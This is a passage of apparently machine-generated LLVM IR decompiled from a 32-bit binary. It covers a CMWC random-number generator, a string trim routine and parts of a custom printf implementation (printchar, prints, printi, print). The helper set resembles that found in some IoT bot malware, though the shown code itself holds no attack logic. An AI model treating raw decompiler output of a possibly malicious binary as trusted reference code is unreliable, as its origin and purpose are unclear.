  %v2_80481df = xor i32 %storemerge5, -1640531527
  %v1_80481e1 = xor i32 %v2_80481df, %v2_80481da
  store i32 %v1_80481e1, i32* %eax.global-to-local, align 4
  %v2_80481e6 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e6 = add i32 %v2_80481e6, ptrtoint (i32* @global_var_805a0a0.7 to i32)
  %v4_80481e6 = inttoptr i32 %v3_80481e6 to i32*
  store i32 %v1_80481e1, i32* %v4_80481e6, align 4
  %v4_80481ed = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481ed, 4096
  br i1 %exitcond, label %dec_label_pc_80481f9, label %dec_label_pc_80481bd

dec_label_pc_80481f9:                             ; preds = %dec_label_pc_80481bd
  %v0_80481fa = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481fa

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481bd, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048217 = load i32, i32* @global_var_8059dd0.10, align 16
  %v1_804821c = add i32 %v0_8048217, 1
  %v1_804821d = urem i32 %v1_804821c, 4096
  store i32 %v1_804821d, i32* @global_var_8059dd0.10, align 16
  %v1_804822c = mul nuw nsw i32 %v1_804821d, 4
  %v2_804822c = add i32 %v1_804822c, ptrtoint (i32* @global_var_805a0a0.7 to i32)
  %v3_804822c = inttoptr i32 %v2_804822c to i32*
  %v4_804822c = load i32, i32* %v3_804822c, align 4
  %v7_8048249 = udiv i32 %v4_804822c, 228675
  store i32 %v7_8048249, i32* @global_var_8059dcc.11, align 4
  br i1 true, label %dec_label_pc_8048299, label %dec_label_pc_804828b

dec_label_pc_804828b:                             ; preds = %entry
  br label %dec_label_pc_8048299

dec_label_pc_8048299:                             ; preds = %entry, %dec_label_pc_804828b
  %v1_80482ae = mul nuw nsw i32 %v1_804821d, 4
  %v2_80482ae = add i32 %v1_80482ae, ptrtoint (i32* @global_var_805a0a0.7 to i32)
  %v3_80482ae = inttoptr i32 %v2_80482ae to i32*
  %v4_80482ae = load i32, i32* %v3_80482ae, align 4
  ret i32 %v4_80482ae

; uselistorder directives
  uselistorder i32 %v1_804821d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048299, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80482be = load i32, i32* @edi, align 4
  store i32 %v0_80482be, i32* %stack_var_-8, align 4
  %v4_80482c9 = ptrtoint i8* %arg1 to i32
  store i1 false, i1* @df, align 1
  %v3_80482da = call i32 @_strlen(i8* %arg1)
  %v1_80482e1 = add i32 %v3_80482da, -1
  br label %dec_label_pc_80482ea

dec_label_pc_80482e7:                             ; preds = %dec_label_pc_80482ea
  %v4_80482e7 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482ea

dec_label_pc_80482ea:                             ; preds = %entry, %dec_label_pc_80482e7
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e7, %dec_label_pc_80482e7 ]
  %v6_80482ed = add i32 %stack_var_-16.0, %v4_80482c9
  %v1_80482f0 = inttoptr i32 %v6_80482ed to i8*
  %v2_80482f0 = load i8, i8* %v1_80482f0, align 1
  %v2_80482f3 = sext i8 %v2_80482f0 to i32
  %v1_80482f9 = call i32 @isspace(i32 %v2_80482f3)
  %v1_80482fe = icmp eq i32 %v1_80482f9, 0
  %v1_8048300 = icmp eq i1 %v1_80482fe, false
  br i1 %v1_8048300, label %dec_label_pc_80482e7, label %dec_label_pc_8048307.preheader

dec_label_pc_8048307.preheader:                   ; preds = %dec_label_pc_80482ea
  %v5_804830d18 = icmp slt i32 %v1_80482e1, %stack_var_-16.0
  br i1 %v5_804830d18, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_8048304:                             ; preds = %dec_label_pc_804830f
  %v4_8048304 = add i32 %stack_var_-12.019, -1
  %v5_804830d = icmp slt i32 %v4_8048304, %stack_var_-16.0
  br i1 %v5_804830d, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_804830f:                             ; preds = %dec_label_pc_8048307.preheader, %dec_label_pc_8048304
  %stack_var_-12.019 = phi i32 [ %v4_8048304, %dec_label_pc_8048304 ], [ %v1_80482e1, %dec_label_pc_8048307.preheader ]
  %v6_8048312 = add i32 %stack_var_-12.019, %v4_80482c9
  %v1_8048315 = inttoptr i32 %v6_8048312 to i8*
  %v2_8048315 = load i8, i8* %v1_8048315, align 1
  %v2_8048318 = sext i8 %v2_8048315 to i32
  %v1_804831e = call i32 @isspace(i32 %v2_8048318)
  %v1_8048323 = icmp eq i32 %v1_804831e, 0
  %v1_8048325 = icmp eq i1 %v1_8048323, false
  br i1 %v1_8048325, label %dec_label_pc_8048304, label %dec_label_pc_8048327

dec_label_pc_8048327:                             ; preds = %dec_label_pc_8048304, %dec_label_pc_804830f, %dec_label_pc_8048307.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_80482e1, %dec_label_pc_8048307.preheader ], [ %stack_var_-12.019, %dec_label_pc_804830f ], [ %v4_8048304, %dec_label_pc_8048304 ]
  br label %dec_label_pc_804834a

dec_label_pc_804832f:                             ; preds = %dec_label_pc_804834a
  %v6_804833f = add i32 %storemerge, %v4_80482c9
  %v1_8048342 = inttoptr i32 %v6_804833f to i8*
  %v2_8048342 = load i8, i8* %v1_8048342, align 1
  %v3_8048345 = inttoptr i32 %v6_804835a to i8*
  store i8 %v2_8048342, i8* %v3_8048345, align 1
  %v4_8048347 = add i32 %storemerge, 1
  br label %dec_label_pc_804834a

dec_label_pc_804834a:                             ; preds = %dec_label_pc_8048327, %dec_label_pc_804832f
  %storemerge = phi i32 [ %v4_8048347, %dec_label_pc_804832f ], [ %stack_var_-16.0, %dec_label_pc_8048327 ]
  %v7_8048350 = icmp sgt i32 %storemerge, %stack_var_-12.0.lcssa
  %v2_8048358 = sub i32 %storemerge, %stack_var_-16.0
  %v6_804835a = add i32 %v2_8048358, %v4_80482c9
  br i1 %v7_8048350, label %dec_label_pc_8048352, label %dec_label_pc_804832f

dec_label_pc_8048352:                             ; preds = %dec_label_pc_804834a
  %v22_804835a = inttoptr i32 %v6_804835a to i8*
  store i8 0, i8* %v22_804835a, align 1
  %v2_8048363 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048363, i32* @edi, align 4
  ret i32 %v6_804835a

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-12.019, { 0, 2, 1 }
  uselistorder i32 %v1_80482e1, { 2, 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804834a, { 1, 0 }
  uselistorder label %dec_label_pc_8048327, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830f, { 1, 0 }
  uselistorder label %dec_label_pc_80482ea, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_80483a6

dec_label_pc_804838b:                             ; preds = %entry
  %v3_80483a1 = bitcast i8* %stack_var_8 to i32*
  %v4_80483a1 = call i32 @__libc_write(i32 1, i32* %v3_80483a1, i32 1)
  br label %dec_label_pc_80483a6

dec_label_pc_80483a6:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_80483a7 = phi i32 [ %tmp5, %dec_label_pc_8048372 ], [ %v4_80483a1, %dec_label_pc_804838b ]
  ret i32 %v0_80483a7

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80483a6, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = icmp slt i32 %arg3, 1
  br i1 %tmp13, label %dec_label_pc_8048409, label %dec_label_pc_80483c2

dec_label_pc_80483c2:                             ; preds = %entry
  %v4_80483c9 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c9, i32* @edx, align 4
  %v2_80483da45 = load i8, i8* %arg2, align 1
  %v4_80483dd47 = icmp eq i8 %v2_80483da45, 0
  %v1_80483df49 = icmp eq i1 %v4_80483dd47, false
  br i1 %v1_80483df49, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483d1:                             ; preds = %dec_label_pc_80483c2, %dec_label_pc_80483d1
  %v4_80483d751 = phi i32 [ %v5_80483d4, %dec_label_pc_80483d1 ], [ %v4_80483c9, %dec_label_pc_80483c2 ]
  %stack_var_-12.050 = phi i32 [ %v4_80483d1, %dec_label_pc_80483d1 ], [ 0, %dec_label_pc_80483c2 ]
  %v4_80483d1 = add i32 %stack_var_-12.050, 1
  %v5_80483d4 = add i32 %v4_80483d751, 1
  %v22_80483d4 = inttoptr i32 %v5_80483d4 to i8*
  store i32 %v5_80483d4, i32* @edx, align 4
  %v2_80483da = load i8, i8* %v22_80483d4, align 1
  %v4_80483dd = icmp eq i8 %v2_80483da, 0
  %v1_80483df = icmp eq i1 %v4_80483dd, false
  br i1 %v1_80483df, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483e1:                             ; preds = %dec_label_pc_80483d1, %dec_label_pc_80483c2
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483c2 ], [ %v4_80483d1, %dec_label_pc_80483d1 ]
  %v5_80483e7 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483e7, label %dec_label_pc_80483f2, label %dec_label_pc_80483f8

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483e1
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483f5 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483f8

dec_label_pc_80483f8:                             ; preds = %dec_label_pc_80483e1, %dec_label_pc_80483f2
  %storemerge = phi i32 [ %v5_80483f5, %dec_label_pc_80483f2 ], [ 0, %dec_label_pc_80483e1 ]
  %v1_80483fb = and i32 %arg4, 2
  %tmp14 = mul nuw nsw i32 %v1_80483fb, 8
  %tmp15 = or i32 %tmp14, 32
  br label %dec_label_pc_8048409

dec_label_pc_8048409:                             ; preds = %dec_label_pc_80483f8, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483f8 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp15, %dec_label_pc_80483f8 ]
  %v1_804840c = urem i32 %arg4, 2
  %v2_804840c = icmp eq i32 %v1_804840c, 0
  %v1_8048411 = icmp eq i1 %v2_804840c, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048411, label %dec_label_pc_8048453.preheader, label %dec_label_pc_804842d.preheader

dec_label_pc_804842d.preheader:                   ; preds = %dec_label_pc_8048409
  %tmp1638 = icmp slt i32 %stack_var_12.0, 1
  %tmp1739 = icmp eq i1 %tmp1638, false
  br i1 %tmp1739, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048415:                             ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415
  %stack_var_-20.041 = phi i32 [ %v4_8048427, %dec_label_pc_8048415 ], [ 0, %dec_label_pc_804842d.preheader ]
  %stack_var_12.140 = phi i32 [ %v4_804842a, %dec_label_pc_8048415 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ]
  %v3_8048422 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048427 = add i32 %stack_var_-20.041, 1
  %v4_804842a = add i32 %stack_var_12.140, -1
  %tmp16 = icmp slt i32 %v4_804842a, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048453.preheader:                   ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415, %dec_label_pc_8048409
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048409 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ], [ %v4_804842a, %dec_label_pc_8048415 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048409 ], [ 0, %dec_label_pc_804842d.preheader ], [ %v4_8048427, %dec_label_pc_8048415 ]
  %v4_804845326 = ptrtoint i8* %arg2 to i32
  %v2_804845627 = load i8, i8* %arg2, align 1
  %v4_804845929 = icmp eq i8 %v2_804845627, 0
  %v1_804845b31 = icmp eq i1 %v4_804845929, false
  br i1 %v1_804845b31, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048435:                             ; preds = %dec_label_pc_8048453.preheader, %dec_label_pc_8048435
  %v4_804845334 = phi i32 [ %v5_8048450, %dec_label_pc_8048435 ], [ %v4_804845326, %dec_label_pc_8048453.preheader ]
  %stack_var_-20.133 = phi i32 [ %v4_804844d, %dec_label_pc_8048435 ], [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ]
  %stack_var_8.032 = phi i8* [ %v22_8048450, %dec_label_pc_8048435 ], [ %arg2, %dec_label_pc_8048453.preheader ]
  %v2_8048438 = load i8, i8* %stack_var_8.032, align 1
  %v3_8048438 = zext i8 %v2_8048438 to i32
  %v3_8048448 = call i32 @printchar(i32* %.pre, i32 %v3_8048438)
  %v4_804844d = add i32 %stack_var_-20.133, 1
  %v5_8048450 = add i32 %v4_804845334, 1
  %v22_8048450 = inttoptr i32 %v5_8048450 to i8*
  %v2_8048456 = load i8, i8* %v22_8048450, align 1
  %v4_8048459 = icmp eq i8 %v2_8048456, 0
  %v1_804845b = icmp eq i1 %v4_8048459, false
  br i1 %v1_804845b, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048477.preheader:                   ; preds = %dec_label_pc_8048435, %dec_label_pc_8048453.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ], [ %v4_804844d, %dec_label_pc_8048435 ]
  %tmp1822 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp1923 = icmp eq i1 %tmp1822, false
  br i1 %tmp1923, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804845f:                             ; preds = %dec_label_pc_8048477.preheader, %dec_label_pc_804845f
  %stack_var_-20.225 = phi i32 [ %v4_8048471, %dec_label_pc_804845f ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ]
  %stack_var_12.324 = phi i32 [ %v4_8048474, %dec_label_pc_804845f ], [ %stack_var_12.2.ph, %dec_label_pc_8048477.preheader ]
  %v3_804846c = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048471 = add i32 %stack_var_-20.225, 1
  %v4_8048474 = add i32 %stack_var_12.324, -1
  %tmp18 = icmp slt i32 %v4_8048474, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %dec_label_pc_804845f, %dec_label_pc_8048477.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ], [ %v4_8048471, %dec_label_pc_804845f ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048474, { 1, 0 }
  uselistorder i8* %v22_8048450, { 1, 0 }
  uselistorder i32 %v5_8048450, { 1, 0 }
  uselistorder i32 %v4_804842a, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483d4, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804845f, { 1, 0 }
  uselistorder label %dec_label_pc_8048435, { 1, 0 }
  uselistorder label %dec_label_pc_8048453.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048415, { 1, 0 }
  uselistorder label %dec_label_pc_80483f8, { 1, 0 }
  uselistorder label %dec_label_pc_80483d1, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048496 = trunc i64 %arg2 to i32
  %v5_804849c = icmp eq i32 %v4_8048496, 0
  %v6_804849c = icmp slt i32 %v4_8048496, 0
  %v1_80484a0 = icmp eq i1 %v5_804849c, false
  br i1 %v1_80484a0, label %dec_label_pc_80484d2, label %dec_label_pc_80484a2

dec_label_pc_80484a2:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp41 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484c5 = call i32 @prints(i32 %arg1, i8* %tmp41, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_80485bc

dec_label_pc_80484d2:                             ; preds = %entry
  %v4_80484d2 = icmp eq i32 %arg4, 0
  br i1 %v4_80484d2, label %dec_label_pc_80484f3, label %dec_label_pc_80484d8

dec_label_pc_80484d8:                             ; preds = %dec_label_pc_80484d2
  %v13_80484d8 = icmp eq i32 %arg3, 10
  %v1_80484dc = icmp eq i1 %v13_80484d8, false
  br i1 %v1_80484dc, label %dec_label_pc_80484f3, label %dec_label_pc_80484de

dec_label_pc_80484de:                             ; preds = %dec_label_pc_80484d8
  %v1_80484e2 = icmp eq i1 %v6_804849c, false
  br i1 %v1_80484e2, label %dec_label_pc_80484f3, label %dec_label_pc_80484e4

dec_label_pc_80484e4:                             ; preds = %dec_label_pc_80484de
  %v1_80484ee = sub i32 0, %v4_8048496
  %v5_80484f0 = sext i32 %v1_80484ee to i64
  br label %dec_label_pc_80484f3

dec_label_pc_80484f3:                             ; preds = %dec_label_pc_80484de, %dec_label_pc_80484d8, %dec_label_pc_80484d2, %dec_label_pc_80484e4
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_80484d2 ], [ %arg2, %dec_label_pc_80484d8 ], [ %arg2, %dec_label_pc_80484de ], [ %v5_80484f0, %dec_label_pc_80484e4 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484d2 ], [ 0, %dec_label_pc_80484d8 ], [ 0, %dec_label_pc_80484de ], [ 1, %dec_label_pc_80484e4 ]
  %tmp42 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp42, align 4
  %v4_80485547 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485548 = icmp eq i32 %v4_80485547, 0
  %v1_804855815 = icmp eq i1 %v5_80485548, false
  br i1 %v1_804855815, label %dec_label_pc_8048504.lr.ph, label %dec_label_pc_804855a

dec_label_pc_8048504.lr.ph:                       ; preds = %dec_label_pc_80484f3
  %v5_8048507 = sext i32 %arg3 to i64
  br label %dec_label_pc_8048504

dec_label_pc_8048504:                             ; preds = %dec_label_pc_8048504.lr.ph, %dec_label_pc_804852c
  %stack_var_-24.117 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048504.lr.ph ], [ %v5_8048551, %dec_label_pc_804852c ]
  %stack_var_-40.016 = phi i8* [ %tmp42, %dec_label_pc_8048504.lr.ph ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v6_8048512 = and i64 %stack_var_-24.117, 4294967295
  %v12_8048512 = udiv i64 %v6_8048512, %v5_8048507
  %v13_8048512 = trunc i64 %v12_8048512 to i32
  %v14_8048512 = urem i64 %v6_8048512, %v5_8048507
  %v5_8048517 = trunc i64 %v14_8048512 to i8
  %v7_804851e = icmp sgt i8 %v5_8048517, 9
  br i1 %v7_804851e, label %dec_label_pc_8048520, label %dec_label_pc_804852c

dec_label_pc_8048520:                             ; preds = %dec_label_pc_8048504
  %tmp = trunc i64 %v14_8048512 to i32
  %v5_8048523 = add i32 %tmp, %arg7
  %v1_8048526 = add i32 %v5_8048523, 198
  %v11_8048526 = trunc i32 %v1_8048526 to i8
  br label %dec_label_pc_804852c

dec_label_pc_804852c:                             ; preds = %dec_label_pc_8048504, %dec_label_pc_8048520
  %stack_var_-36.0 = phi i8 [ %v11_8048526, %dec_label_pc_8048520 ], [ %v5_8048517, %dec_label_pc_8048504 ]
  %v4_804852c = ptrtoint i8* %stack_var_-40.016 to i32
  %v5_804852c = add i32 %v4_804852c, -1
  %v22_804852c = inttoptr i32 %v5_804852c to i8*
  %v2_8048533 = add i8 %stack_var_-36.0, 48
  store i8 %v2_8048533, i8* %v22_804852c, align 1
  %v5_8048551 = sext i32 %v13_8048512 to i64
  %v5_8048554 = icmp eq i32 %v13_8048512, 0
  %v1_8048558 = icmp eq i1 %v5_8048554, false
  br i1 %v1_8048558, label %dec_label_pc_8048504, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_804852c, %dec_label_pc_80484f3
  %stack_var_-40.0.lcssa = phi i8* [ %tmp42, %dec_label_pc_80484f3 ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v4_804855a = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804855a, label %dec_label_pc_8048594, label %dec_label_pc_8048560

dec_label_pc_8048560:                             ; preds = %dec_label_pc_804855a
  %v4_8048560 = icmp eq i32 %arg5, 0
  br i1 %v4_8048560, label %dec_label_pc_804858b, label %dec_label_pc_8048566

dec_label_pc_8048566:                             ; preds = %dec_label_pc_8048560
  %v1_8048569 = and i32 %arg6, 2
  %v2_8048569 = icmp eq i32 %v1_8048569, 0
  br i1 %v2_8048569, label %dec_label_pc_804858b, label %dec_label_pc_8048570

dec_label_pc_8048570:                             ; preds = %dec_label_pc_8048566
  %v3_804857e = inttoptr i32 %arg1 to i32*
  %v4_804857e = call i32 @printchar(i32* %v3_804857e, i32 45)
  %v4_8048586 = add i32 %arg5, -1
  br label %dec_label_pc_8048594

dec_label_pc_804858b:                             ; preds = %dec_label_pc_8048566, %dec_label_pc_8048560
  %v4_804858b = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804858b = add i32 %v4_804858b, -1
  %v22_804858b = inttoptr i32 %v5_804858b to i8*
  store i8 45, i8* %v22_804858b, align 1
  br label %dec_label_pc_8048594

dec_label_pc_8048594:                             ; preds = %dec_label_pc_804855a, %dec_label_pc_8048570, %dec_label_pc_804858b
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_804855a ], [ %arg5, %dec_label_pc_804858b ], [ %v4_8048586, %dec_label_pc_8048570 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_804855a ], [ %v22_804858b, %dec_label_pc_804858b ], [ %stack_var_-40.0.lcssa, %dec_label_pc_8048570 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804855a ], [ 0, %dec_label_pc_804858b ], [ 1, %dec_label_pc_8048570 ]
  %v6_80485af = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_80485b7 = add i32 %v6_80485af, %stack_var_-28.0
  store i32 %v2_80485b7, i32* @edx, align 4
  br label %dec_label_pc_80485bc

dec_label_pc_80485bc:                             ; preds = %dec_label_pc_80484a2, %dec_label_pc_8048594
  %storemerge = phi i32 [ %v2_80485b7, %dec_label_pc_8048594 ], [ %v6_80484c5, %dec_label_pc_80484a2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_804852c, { 0, 2, 1 }
  uselistorder i8 %v5_8048517, { 1, 0 }
  uselistorder i64 %v6_8048512, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485bc, { 1, 0 }
  uselistorder label %dec_label_pc_8048594, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804852c, { 1, 0 }
  uselistorder label %dec_label_pc_8048504, { 1, 0 }
  uselistorder label %dec_label_pc_80484f3, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80485c1 = load i32, i32* @ebp, align 4
  store i32 %v0_80485c1, i32* %stack_var_-4, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.435 = inttoptr i32 %arg2 to i8*
  %v2_804887536 = load i8, i8* %stack_var_8.435, align 1
  %v4_804887838 = icmp eq i8 %v2_804887536, 0
  %v1_804887a40 = icmp eq i1 %v4_804887838, false
  br i1 %v1_804887a40, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_80485d3:                             ; preds = %entry, %dec_label_pc_804886f
  %stack_var_8.444 = phi i8* [ %stack_var_8.4, %dec_label_pc_804886f ], [ %stack_var_8.435, %entry ]
  %stack_var_-28.143 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804886f ], [ 0, %entry ]
  %stack_var_12.142 = phi i32 [ %stack_var_12.0, %dec_label_pc_804886f ], [ %arg3, %entry ]
  %stack_var_8.4.in41 = phi i32 [ %v5_804886f, %dec_label_pc_804886f ], [ %arg2, %entry ]
  %v2_80485d6 = load i8, i8* %stack_var_8.444, align 1
  %v10_80485d9 = icmp eq i8 %v2_80485d6, 37
  %v1_80485db = icmp eq i1 %v10_80485d9, false
  br i1 %v1_80485db, label %dec_label_pc_8048854, label %dec_label_pc_80485e1

dec_label_pc_80485e1:                             ; preds = %dec_label_pc_80485d3
  %v5_80485e1 = add i32 %stack_var_8.4.in41, 1
  %v22_80485e1 = inttoptr i32 %v5_80485e1 to i8*
  %v2_80485f4 = load i8, i8* %v22_80485e1, align 1
  %v4_80485f7 = icmp eq i8 %v2_80485f4, 0
  br i1 %v4_80485f7, label %dec_label_pc_8048880, label %dec_label_pc_80485ff

dec_label_pc_80485ff:                             ; preds = %dec_label_pc_80485e1
  %v2_8048602 = load i8, i8* %v22_80485e1, align 1
  %v10_8048605 = icmp eq i8 %v2_8048602, 37
  br i1 %v10_8048605, label %dec_label_pc_8048854, label %dec_label_pc_804860d

dec_label_pc_804860d:                             ; preds = %dec_label_pc_80485ff
  %v2_8048610 = load i8, i8* %v22_80485e1, align 1
  %v10_8048613 = icmp eq i8 %v2_8048610, 45
  %v1_8048615 = icmp eq i1 %v10_8048613, false
  br i1 %v1_8048615, label %dec_label_pc_804862a.preheader, label %dec_label_pc_8048617

dec_label_pc_8048617:                             ; preds = %dec_label_pc_804860d
  %v5_8048617 = add i32 %stack_var_8.4.in41, 2
  %v22_8048617 = inttoptr i32 %v5_8048617 to i8*
  br label %dec_label_pc_804862a.preheader

dec_label_pc_804862a.preheader:                   ; preds = %dec_label_pc_8048617, %dec_label_pc_804860d
  %stack_var_8.0.ph = phi i8* [ %v22_80485e1, %dec_label_pc_804860d ], [ %v22_8048617, %dec_label_pc_8048617 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804860d ], [ 1, %dec_label_pc_8048617 ]
  %v4_804862a22 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_804862d23 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_804863030 = icmp eq i8 %v2_804862d23, 48
  br i1 %v7_804863030, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048623:                             ; preds = %dec_label_pc_804862a.preheader, %dec_label_pc_8048623
  %v4_804862a33 = phi i32 [ %v5_8048623, %dec_label_pc_8048623 ], [ %v4_804862a22, %dec_label_pc_804862a.preheader ]
  %stack_var_-32.032 = phi i32 [ %v4_8048626, %dec_label_pc_8048623 ], [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ]
  %v5_8048623 = add i32 %v4_804862a33, 1
  %v22_8048623 = inttoptr i32 %v5_8048623 to i8*
  %v4_8048626 = or i32 %stack_var_-32.032, 2
  %v2_804862d = load i8, i8* %v22_8048623, align 1
  %v7_8048630 = icmp eq i8 %v2_804862d, 48
  br i1 %v7_8048630, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048659.preheader:                   ; preds = %dec_label_pc_8048623, %dec_label_pc_804862a.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804862a.preheader ], [ %v22_8048623, %dec_label_pc_8048623 ]
